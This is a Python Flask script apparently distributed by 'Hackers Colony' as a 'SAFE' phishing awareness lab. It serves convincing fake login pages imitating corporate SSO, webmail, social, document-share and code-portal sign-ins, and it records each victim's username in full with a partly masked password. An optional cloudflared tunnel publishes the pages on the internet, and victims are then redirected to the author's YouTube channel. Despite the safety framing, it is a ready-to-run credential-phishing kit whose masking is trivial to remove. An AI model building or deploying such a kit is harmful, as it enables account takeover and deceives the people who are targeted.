#!/usr/bin/env python3
"""
HCO.py — HCO Phishing Awareness Lab (SAFE)
By Azhar — Hackers Colony

Safe awareness simulator:
 - Passwords are masked when printed.
 - No raw passwords stored or transmitted unless you explicitly enable logging with consent.
 - Use only in controlled labs or with explicit permission.
"""

import argparse
import os
import re
import shlex
import shutil
import signal
import subprocess
import threading
import time
import webbrowser
from flask import Flask, request, render_template_string, redirect

# ---------- Colors ----------
RED = "\033[1;31m"
GRN = "\033[1;32m"
YEL = "\033[1;33m"
CYN = "\033[1;36m"
WHT = "\033[1;37m"
RST = "\033[0m"

def cprint(col, *args, **kwargs):
    print(col + " ".join(map(str, args)) + RST, **kwargs)

# ---------- Config ----------
APP_HOST = "0.0.0.0"
APP_PORT = 5000
DEFAULT_REDIRECT = "https://youtube.com/@hackers_colony_tech?sub_confirmation=1"
CLOUDFLARED_CMD = "cloudflared"

# ---------- Ensure Flask installed ----------
def ensure_flask():
    try:
        import flask  # noqa: F401
    except Exception:
        cprint(YEL, "[~] Flask not found. Installing via pip (please wait)...")
        py = shutil.which("python") or shutil.which("python3") or "python"
        subprocess.check_call([py, "-m", "pip", "install", "Flask"], stdout=subprocess.DEVNULL)

# ---------- Flask app & templates ----------
app = Flask(__name__)

TEMPLATE_BASE = r"""
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ title }}</title>
<style>
  :root{--bg:#071428;--card:#0b1220;--muted:#cbd5e1;--accent:#3b82f6}
  body{margin:0;min-height:100vh;background:linear-gradient(135deg,var(--bg),#06102a);font-family:Inter,system-ui,Arial;color:#e6eef8;display:flex;align-items:center;justify-content:center}
  .card{width:100%;max-width:420px;background:rgba(255,255,255,0.03);padding:26px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
  h1{margin:0 0 8px;color:#ff5d5d}
  p{color:var(--muted);margin:0 0 12px}
  label{display:block;margin-top:10px;color:#dbeafe}
  input{width:100%;padding:12px;margin-top:6px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#fff}
  .row{display:flex;gap:8px;align-items:center;justify-content:space-between;margin-top:14px}
  button{padding:12px 14px;border-radius:10px;border:none;background:linear-gradient(90deg,#7ee7f7,#6b9cff);color:#042;font-weight:800;cursor:pointer}
  .small{font-size:12px;color:#98c7ff;margin-top:10px}
</style>
</head><body>
  <div class="card">
    <h1>{{ heading }}</h1>
    <p>{{ subtitle }}</p>
    <form method="post" action="{{ action }}">
      {% for f in fields %}
        <label>{{ f[0] }}</label>
        <input type="{{ f[2] }}" name="{{ f[1] }}" placeholder="{{ f[3] }}" required>
      {% endfor %}
      <div class="row">
        <button type="submit">{{ cta }}</button>
      </div>
      <input type="hidden" name="redirect" value="{{ redirect_to }}">
    </form>
    <p class="small">Training simulator — passwords are masked in terminal output.</p>
  </div>
</body></html>
"""

def render_template_for(tid):
    if tid == "sso":
        fields = [("Email address","user","email","name@company.com"), ("Password","pass","password","Password")]
        ctx = dict(title="Secure Sign-In", heading="Company Single Sign-On", subtitle="Use your corporate email.", action="/submit/sso", cta="Sign in", redirect_to=DEFAULT_REDIRECT, fields=fields)
    elif tid == "mail":
        fields = [("Email","user","email","you@example.com"), ("Password","pass","password","Password")]
        ctx = dict(title="WebMail", heading="WebMail Portal", subtitle="Authenticate to access mailbox.", action="/submit/mail", cta="Sign in", redirect_to=DEFAULT_REDIRECT, fields=fields)
    elif tid == "social":
        fields = [("Username or email","user","text","username or email"), ("Password","pass","password","Password")]
        ctx = dict(title="Account Login", heading="Account Login", subtitle="Welcome back — enter credentials.", action="/submit/social", cta="Log in", redirect_to=DEFAULT_REDIRECT, fields=fields)
    elif tid == "drive":
        fields = [("Email","user","email","name@example.com"), ("Password","pass","password","Password")]
        ctx = dict(title="Document Share", heading="Access Shared Document", subtitle="Sign in to view the document.", action="/submit/drive", cta="Continue", redirect_to=DEFAULT_REDIRECT, fields=fields)
    elif tid == "github":
        fields = [("Username or email","user","text","username or email"), ("Password","pass","password","Password")]
        ctx = dict(title="Code Portal", heading="Code Portal Sign-in", subtitle="Authenticate to continue.", action="/submit/github", cta="Sign in", redirect_to=DEFAULT_REDIRECT, fields=fields)
    else:
        fields = [("User","user","text","username"), ("Password","pass","password","Password")]
        ctx = dict(title="Sign In", heading="Sign In", subtitle="Demo", action="/submit/social", cta="Sign in", redirect_to=DEFAULT_REDIRECT, fields=fields)
    return render_template_string(TEMPLATE_BASE, **ctx)

# ---------- Routes ----------
@app.route("/")
def landing():
    html = f"""
    <!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>HCO Phish by Azhar</title>
    <style>body{{font-family:Inter,system-ui,Arial;display:flex;align-items:center;justify-content:center;height:100vh;background:linear-gradient(135deg,#071028,#07102a);color:#fff}}.box{{max-width:760px;padding:24px;border-radius:12px;background:rgba(255,255,255,0.02)}}</style></head><body>
      <div class="box">
        <h1 style="color:#ff5d5d">HCO Phish by Azhar</h1>
        <p>Select a scenario to preview (lab use only):</p>
        <p>
          <a href="/demo/sso">Corporate SSO</a> |
          <a href="/demo/mail">WebMail</a> |
          <a href="/demo/social">Account Login</a> |
          <a href="/demo/drive">Doc Share</a> |
          <a href="/demo/github">Code Portal</a>
        </p>
        <p style="color:#9fbfff">This is a training simulator — passwords are masked in the Termux console only.</p>
      </div>
    </body></html>
    """
    return html

@app.route("/demo/<name>")
def demo(name):
    return render_template_for(name.lower())

@app.route("/submit/<tid>", methods=["POST"])
def submit(tid):
    # Extract
    user = request.form.get("user", request.form.get("username","[unknown]"))
    pw = request.form.get("pass", request.form.get("password",""))
    # Mask password for printing (show only first char + dots) — never store raw pw unless consent granted
    masked_pw = (pw[0] + "●"*(min(len(pw)-1, 7))) if pw else ""
    cprint(GRN, f"[CAPTURE] Template={tid}  user={user!r}  pass={masked_pw}")
    # Optional: consented logging: if LOG_CONSENT_FILE exists and contains 'yes' we append username+masked
    try:
        if os.path.exists("consent_accept.txt"):
            with open("consent_accept.txt","r") as cf:
                if cf.read().strip().lower()=="yes":
                    with open("captures.log","a") as out:
                        out.write(f"{time.ctime()} | {tid} | {user} | {masked_pw}\n")
    except Exception:
        pass
    # redirect to safe destination
    return render_template_string('<html><body><p>Processing…</p><script>setTimeout(function(){window.location="{{url}}"},800)</script></body></html>', url=request.form.get("redirect") or DEFAULT_REDIRECT)

# ---------- Cloudflared manager ----------
class CloudflaredManager:
    def __init__(self, port=APP_PORT):
        self.port = port
        self.proc = None
        self.public_url = None
        self.thread = None
        self.pattern = re.compile(r"https?://[A-Za-z0-9\-.]+\.trycloudflare\.com")

    def available(self):
        return shutil.which(CLOUDFLARED_CMD) is not None

    def start(self):
        if not self.available():
            cprint(YEL, "[!] cloudflared not found in PATH.")
            return False
        cmd = [CLOUDFLARED_CMD, "tunnel", "--url", f"http://127.0.0.1:{self.port}"]
        try:
            self.proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        except Exception as e:
            cprint(RED, f"[!] Failed to start cloudflared: {e}")
            return False
        self.thread = threading.Thread(target=self._read_output, daemon=True)
        self.thread.start()
        return True

    def _read_output(self):
        try:
            while True:
                if self.proc is None:
                    break
                line = self.proc.stdout.readline()
                if not line:
                    break
                line = line.strip()
                print(f"{CYN}[cloudflared]{RST} {line}")
                m = self.pattern.search(line)
                if m and not self.public_url:
                    self.public_url = m.group(0)
                    cprint(GRN, f"[+] Public URL: {self.public_url}")
        except Exception as e:
            cprint(YEL, f"[cloudflared] reader error: {e}")

    def stop(self):
        try:
            if self.proc and self.proc.poll() is None:
                self.proc.terminate()
                time.sleep(0.3)
                if self.proc.poll() is None:
                    self.proc.kill()
        except Exception:
            pass
        self.proc = None

# ---------- Helpers ----------
def run_flask_thread():
    t = threading.Thread(target=lambda: app.run(host=APP_HOST, port=APP_PORT, debug=False, use_reloader=False), daemon=True)
    t.start()
    time.sleep(0.8)
    return t

def open_url(url):
    # try Termux and system openers
    openers = ("termux-open-url","termux-open","xdg-open")
    for o in openers:
        if shutil.which(o):
            try:
                subprocess.Popen([o, url])
                return True
            except Exception:
                pass
    try:
        webbrowser.open(url)
        return True
    except Exception:
        return False

def print_banner():
    os.system("clear" if os.name!="nt" else "cls")
    cprint(RED, "HCO Phishing by Azhar")
    cprint(WHT, "Awareness Lab — looks realistic; passwords masked in terminal output.")
    print()

# ---------- CLI & main ----------
import argparse, shutil, webbrowser

def main():
    parser = argparse.ArgumentParser(description="HCO Phishing by Azhar — Awareness Lab (SAFE)")
    parser.add_argument("--tunnel", action="store_true", help="Attempt ephemeral cloudflared tunnel (requires cloudflared installed & authenticated)")
    parser.add_argument("--open", action="store_true", help="Open local demo URL in browser automatically")
    parser.add_argument("--log", action="store_true", help="Enable consented logging to captures.log (requires explicit consent at prompt)")
    args = parser.parse_args()

    ensure_flask()
    print_banner()

    # start flask
    run_flask_thread()
    local_url = f"http://127.0.0.1:{APP_PORT}"
    cprint(CYN, f"[>] Local demo: {local_url}")
    if args.open:
        open_url(local_url)

    # handle consented logging
    if args.log:
        print()
        cprint(YEL, "You asked to enable consented logging.")
        consent = input("Do you confirm you have explicit consent from participants to log username+masked password to captures.log? (yes/no): ").strip().lower()
        if consent == "yes":
            with open("consent_accept.txt","w") as cf:
                cf.write("yes")
            cprint(GRN, "[+] Consent recorded (consent_accept.txt). Logging will record username+masked password to captures.log.")
        else:
            cprint(RED, "[!] Consent denied — logging will NOT be enabled.")

    # start cloudflared if requested
    cf = None
    if args.tunnel:
        cf = CloudflaredManager(APP_PORT)
        cprint(CYN, "[*] Attempting to start cloudflared tunnel (requires cloudflared installed & authenticated).")
        ok = cf.start()
        if not ok:
            cprint(YEL, "[!] cloudflared failed to start or not available. Continue local only.")
        else:
            cprint(CYN, "[*] Waiting up to 30s for public URL...")
            for _ in range(30):
                if cf.public_url:
                    break
                time.sleep(1)
            if cf.public_url:
                cprint(GRN, f"[OK] Public URL: {cf.public_url}")
                if args.open:
                    open_url(cf.public_url)
            else:
                cprint(YEL, "[!] Public URL not detected yet. Check cloudflared logs above.")

    try:
        cprint(WHT, "\nInteractive mode. Press Ctrl+C to quit.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cprint(YEL, "\nShutting down...")
        if cf:
            cf.stop()
        cprint(GRN, "Goodbye.")

if __name__ == "__main__":
    main()
